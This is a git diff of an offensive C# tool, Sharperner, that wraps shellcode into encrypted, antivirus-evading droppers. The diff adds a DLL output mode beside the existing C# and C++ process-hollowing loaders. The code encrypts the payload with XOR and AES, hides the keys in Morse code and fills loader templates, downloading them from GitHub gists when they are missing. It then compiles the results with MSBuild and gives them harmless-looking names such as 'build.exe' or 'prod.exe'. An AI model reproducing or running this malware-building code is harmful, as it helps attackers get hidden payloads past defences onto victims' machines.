@@ -329,7 +329,7 @@ namespace Sharperner
 
     public static class Compile
     {
-        public static void CompileWithMSBuild(string msBuildPath, string slnFile, string projectName)
+        public static void CompileWithMSBuild(string msBuildPath, string projFile, string projectName, string platform)
         {
             var executablePath = $"\"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\"";
 
@@ -339,16 +339,19 @@ namespace Sharperner
                 Environment.Exit(0);
             }
 
-            var strCmd = $"/c {executablePath} {slnFile} /t:{projectName} /p:Configuration=Release /p:Platform=x64";
+            var strCmd = $"/c {executablePath} {projFile} /p:Configuration=Release /p:Platform={platform}";
 
             using (Process compiler = new Process())
             {
                 compiler.StartInfo.FileName = @"CMD.exe";
                 compiler.StartInfo.Arguments = strCmd;
                 compiler.StartInfo.UseShellExecute = false;
-                compiler.StartInfo.CreateNoWindow = true;
+                compiler.StartInfo.CreateNoWindow = false;
                 compiler.StartInfo.RedirectStandardError = true;
+                compiler.StartInfo.RedirectStandardOutput = true;
                 compiler.Start();
+                compiler.WaitForExit();
+
             }
         }
 
@@ -357,7 +360,7 @@ namespace Sharperner
             //compile the code
             //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standarderror?redirectedfrom=MSDN&view=net-5.0#System_Diagnostics_Process_StandardError
 
-            string strCmd = $"/c {cscPath} /out:{outputFile} {tempFile}";
+            string strCmd = $"/c \"{cscPath}\" /out:{outputFile} {tempFile}";
             try
             {
                 Process process = new Process();
@@ -592,12 +595,12 @@ namespace Sharperner
         public static void banner()
         {
             string banner = @"
-███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗██████╗ ███╗   ██╗███████╗██████╗ 
-██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
-███████╗███████║███████║██████╔╝██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗  ██████╔╝
-╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝  ██╔══██╗
-███████║██║  ██║██║  ██║██║  ██║██║     ███████╗██║  ██║██║ ╚████║███████╗██║  ██║
-╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  
+░██████╗██╗░░██╗░█████╗░██████╗░██████╗░███████╗██████╗░███╗░░██╗███████╗██████╗░
+██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
+╚█████╗░███████║███████║██████╔╝██████╔╝█████╗░░██████╔╝██╔██╗██║█████╗░░██████╔╝
+░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═══╝░██╔══╝░░██╔══██╗██║╚████║██╔══╝░░██╔══██╗
+██████╔╝██║░░██║██║░░██║██║░░██║██║░░░░░███████╗██║░░██║██║░╚███║███████╗██║░░██║
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
 by @ch4rm with <3
 ";
             Console.WriteLine(banner);
@@ -607,11 +610,12 @@ by @ch4rm with <3
         {
             string help = @"
 /file       B64,hex,raw 
-/type       cs,cpp
+/type       cs,cpp,dll
 /out        Output file Location. (Optional)
 /save       Keep pre compiled code. (Optional)
+
 /convert    File input
-            (Embed Native executable to .NET Assembly using Manual Mapping)
+            (Embed native executable to .NET Assembly using Manual Mapping)
 
 Example:
 Sharperner.exe /file:file.txt /type:cpp
@@ -633,7 +637,6 @@ Sharperner.exe /convert:file.exe
             string morsed_aesiv = "";
             var filePath = "";
             var outputFile = "";
-            var dropperFormat = "";
 
             // generate random aes key and iv
             string aes_key = Convert.ToBase64String(GetRandomKey());
@@ -651,6 +654,8 @@ Sharperner.exe /convert:file.exe
                     arguments[argument] = string.Empty;
             }
 
+
+
             if (arguments.Count == 0)
             {
                 Console.WriteLine("[!] No arguments supplied");
@@ -658,6 +663,9 @@ Sharperner.exe /convert:file.exe
             }
             else if (arguments.ContainsKey("/file"))
             {
+                var dropperFormat = arguments["/type"].ToLower();
+                var allowedFormat = new List<string> { "cs", "cpp", "dll" };
+
                 if (!arguments.ContainsKey("/type"))
                 {
                     Console.WriteLine("[!] Missing /type argument");
@@ -670,19 +678,18 @@ Sharperner.exe /convert:file.exe
                 {
                     Console.WriteLine("[!] Empty input file or type");
                 }
-                else if (arguments["/type"].ToLower() != "cs" && arguments["/type"].ToLower() != "cpp")
+                else if (!allowedFormat.Any(s => dropperFormat.Equals(s)))
                 {
-                    Console.WriteLine("[!] Invalid file type. Only cs or cpp are accepted");
+                    Console.WriteLine("[!] Invalid file type. Only cs, cpp or dll are accepted");
                 }
                 else
                 {
                     filePath = arguments["/file"];
-                    dropperFormat = arguments["/type"].ToLower();
 
                     if (!File.Exists(filePath)) //if file exists
                     {
                         Console.WriteLine("[+] Missing input file");
-                        Environment.Exit(0);
+                        return;
                     }
                     else
                     {
@@ -749,15 +756,15 @@ Sharperner.exe /convert:file.exe
                     if (arguments.ContainsKey("/out"))
                     {
                         outputFile = arguments["/out"];
-                        if (!Path.GetExtension(outputFile).Contains(".exe"))
+                        if (Path.GetExtension(outputFile).Contains(".exe"))
                         {
-                            outputFile = $"{outputFile}.exe";
+                            outputFile = Path.GetFileNameWithoutExtension(outputFile);
                         }
                     }
                     else
                     {
                         // choose either one of these
-                        string[] fileName = { "production.exe", "release.exe", "Release_x64.exe", "prod.exe", "config.exe", "buildGradle.exe", "build.exe" };
+                        string[] fileName = { "production", "release", "Release_x64", "prod", "config", "buildGradle", "build" };
                         outputFile = fileName[random.Next(fileName.Length)];
                     }
 
@@ -785,6 +792,7 @@ Sharperner.exe /convert:file.exe
                         //Console.WriteLine($"XOR decrypted text: {sh3Llc0d3}");
 
                         // Open template file
+
                         var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
 
                         var parentDir = directory.FullName;
@@ -795,11 +803,13 @@ Sharperner.exe /convert:file.exe
 
                         string templateFileContent = "";
 
-                        var cscPath = $"\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\"";
+                        var cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
 
                         var templateUrl = "https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs";
 
-                        if (File.Exists(cscPath))
+                        outputFile = outputFile + ".exe";
+
+                        if (!File.Exists(cscPath))
                         {
                             Console.WriteLine("[!] csc.exe not found in path");
                         }
@@ -941,7 +951,7 @@ Sharperner.exe /convert:file.exe
                         // locate the file
                         var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
 
-                        if (directory == null)
+                        if (string.IsNullOrEmpty(directory.ToString()))
                         {
                             Console.WriteLine("[!] Couldn't locate files. Exiting...");
                             Environment.Exit(0);
@@ -953,20 +963,36 @@ Sharperner.exe /convert:file.exe
 
                         var templateFile = Path.Combine(parentDir, @"templates\hollow.cpp");
 
-                        var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
+                        var projFile = Path.Combine(parentDir, @"loader\loader.vcxproj");
 
                         var templateFileContent = "";
+
+                        var loaderExecutableFilePath = "";
+
+                        outputFile = outputFile + ".exe";
 
                         // read all content
                         if (!File.Exists(templateFile)) //if file exists
                         {
                             Console.WriteLine("[!] Template file does not exists in local, fetching online...");
+                            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
+                            if (defaultProxy != null)
+                            {
+                                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
+                                webClient.Proxy = defaultProxy;
+                            }
+
+                            //TLS / SSL fix for old Net WebClient
+                            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+
+                            //headers needed for the github API to answer back
+                            webClient.Headers.Set("User-Agent", "request");
+
                             ServicePointManager.Expect100Continue = true;
                             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-                            WebClient client = new WebClient();
                             try
                             {
-                                templateFileContent = client.DownloadString("https://gist.githubusercontent.com/aniqfakhrul/9d25308ee3666e5d2856e9e940df0297/raw/afed7f6e8479f933c2bad55efb138c93a7646881/hollow_sc.cpp");
+                                templateFileContent = webClient.DownloadString("https://gist.githubusercontent.com/aniqfakhrul/9d25308ee3666e5d2856e9e940df0297/raw/afed7f6e8479f933c2bad55efb138c93a7646881/hollow_sc.cpp");
                             }
                             catch
                             {
@@ -1042,16 +1068,16 @@ Sharperner.exe /convert:file.exe
 
                                 Console.WriteLine($"[+] Compiling native C++ binary...");
 
-                                Compile.CompileWithMSBuild(msBuildPath, slnFile, "loader");
+                                Compile.CompileWithMSBuild(msBuildPath, projFile, "loader","x64");
 
                                 //wait for it to compile
-                                Thread.Sleep(4000);
+                                Thread.Sleep(2000);
 
                             }
                             catch (Exception err)
                             {
                                 Console.WriteLine($"[!] Error Compiling with the following error => {err.Message}");
-                                Environment.Exit(0);
+                                return;
                             }
 
                             try
@@ -1063,7 +1089,7 @@ Sharperner.exe /convert:file.exe
 
                                 Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                                     */
-                                var loaderExecutableFilePath = Path.Combine(parentDir, @"loader\x64\Release\loader.exe");
+                                loaderExecutableFilePath = Path.Combine(parentDir, @"loader\x64\Release\loader.exe");
 
                                 try
                                 {
@@ -1071,14 +1097,7 @@ Sharperner.exe /convert:file.exe
 
                                     File.Copy(loaderExecutableFilePath, currentDirOutputFile, true);
 
-                                    if(File.Exists(loaderExecutableFilePath))
-                                    {
-                                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
-                                    }
-                                    else
-                                    {
-                                        Console.WriteLine($"[!] Fail to generate file");
-                                    }
+                                    Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
 
                                 }
                                 catch
@@ -1086,20 +1105,183 @@ Sharperner.exe /convert:file.exe
                                     Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
                                 }
 
-                                Console.WriteLine("[+] Doing some cleaning...");
+                            }
+                            catch
+                            {
+                                Console.WriteLine("[!] Error Compiling");
+                            }
 
-                                //revert loader
-                                File.WriteAllText(rootFile, temp);
+                            Console.WriteLine("[+] Doing some cleaning...");
 
-                                Thread.Sleep(1000);
+                            //revert loader
+                            File.WriteAllText(rootFile, temp);
 
-                                File.Delete(loaderExecutableFilePath);
+                            Thread.Sleep(1000);
+
+                            File.Delete(loaderExecutableFilePath);
+
+                        }
+
+                    }
+                    else if (dropperFormat == "dll")
+                    {
+                        // locate the file
+                        var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
+
+                        if (string.IsNullOrEmpty(directory.ToString()))
+                        {
+                            Console.WriteLine("[!] Couldn't locate files. Exiting...");
+                            Environment.Exit(0);
+                        }
+
+                        var parentDir = directory.FullName;
+
+                        var rootFile = Path.Combine(parentDir, @"Dlllauncher\Class1.cs");
+
+                        var templateFile = Path.Combine(parentDir, @"templates\dll-template.cs"); ;
+
+                        var projFile = Path.Combine(parentDir, @"Dlllauncher\Dlllauncher.csproj");
+
+                        var templateFileContent = "";
+
+                        var dllFilePath = "";
+
+                        outputFile = outputFile + ".dll";
+
+                        // read all content
+                        if (!File.Exists(templateFile)) //if file exists
+                        {
+                            Console.WriteLine("[!] Template file does not exists in local, fetching online...");
+                            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
+                            if (defaultProxy != null)
+                            {
+                                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
+                                webClient.Proxy = defaultProxy;
+                            }
+
+                            //TLS / SSL fix for old Net WebClient
+                            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+
+                            //headers needed for the github API to answer back
+                            webClient.Headers.Set("User-Agent", "request");
+
+                            ServicePointManager.Expect100Continue = true;
+                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                            try
+                            {
+                                templateFileContent = webClient.DownloadString("https://gist.githubusercontent.com/aniqfakhrul/eb626089b401c5b82a50cf6865eb097a/raw/5cb5e5d1e444ac37a23893efa0b5d09d76e828fe/dlllauncher.cs");
+                            }
+                            catch
+                            {
+                                Console.WriteLine("[!] No internet connection");
+                                Environment.Exit(0);
+                            }
+                        }
+                        else
+                        {
+                            templateFileContent = File.ReadAllText(templateFile);
+                        }
+
+                        //create backup copy of the template
+                        string temp = File.ReadAllText(rootFile);
+
+                        try
+                        {
+                            templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+                        }
+                        catch
+                        {
+                            Console.WriteLine("[!] Error replacing values");
+                        }
+
+                        // write all back into the file
+                        try
+                        {
+                            Console.WriteLine("[+] Writing shellcode to template file...");
+
+                            File.WriteAllText(rootFile, templateFileContent);
+
+                            if (arguments.ContainsKey("/save"))
+                            {
+                                var preCompiledCode = Path.Combine(Directory.GetCurrentDirectory(), "dll-output.cs");
+
+                                File.WriteAllText(preCompiledCode, templateFileContent);
+
+                                Console.WriteLine($"[+] Pre compiled code generated => {Path.GetFileName(preCompiledCode)}");
+                            }
+
+                        }
+                        catch (Exception err)
+                        {
+                            Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
+                            Environment.Exit(0);
+                        }
+
+                        var msBuildPath = GetMSBuildPath();
+
+                        if (string.IsNullOrEmpty(msBuildPath.ToString()))
+                        {
+                            Console.WriteLine("[!] Couldn't find MSBuild.exe location. Exiting...");
+                        }
+                        else
+                        {
+                            try
+                            {
+
+                                Console.WriteLine($"[+] Compiling dll...");
+
+                                Compile.CompileWithMSBuild(msBuildPath, projFile, "Dlllauncher", "x64");
+
+                                //wait for it to compile
+                                Thread.Sleep(2000);
+
+                            }
+                            catch (Exception err)
+                            {
+                                Console.WriteLine($"[!] Error Compiling with the following error => {err.Message}");
+                                return;
+                            }
+
+                            try
+                            {
+                                /*
+                                File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+
+                                File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");
+
+                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                    */
+                                dllFilePath = Path.Combine(parentDir, @"Dlllauncher\bin\x64\Release\Dlllauncher.dll");
+
+                                try
+                                {
+                                    var currentDirOutputFile = $"{Directory.GetCurrentDirectory()}\\{outputFile}";
+
+                                    File.Copy(dllFilePath, currentDirOutputFile, true);
+                                        
+                                    Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
+                                }
+
 
                             }
                             catch
                             {
                                 Console.WriteLine("[!] Error Compiling");
                             }
+
+                            Console.WriteLine("[+] Doing some cleaning...");
+
+                            //revert loader
+                            File.WriteAllText(rootFile, temp);
+
+                            Thread.Sleep(1000);
+
+                            File.Delete(dllFilePath);
 
                         }
 
@@ -1159,7 +1341,7 @@ Sharperner.exe /convert:file.exe
                                 }
                                 else
                                 {
-                                    var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
+                                    var projFile = Path.Combine(parentDir, @"DInvoke\DInvoke.csproj");
 
                                     MorseForFun.InitializeDictionary();
 
@@ -1205,7 +1387,7 @@ Sharperner.exe /convert:file.exe
                                     {
                                         File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
 
-                                        Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
+                                        Compile.CompileWithMSBuild(msBuildPath, projFile, "DInvoke", "x64");
 
                                         Thread.Sleep(2000);
 
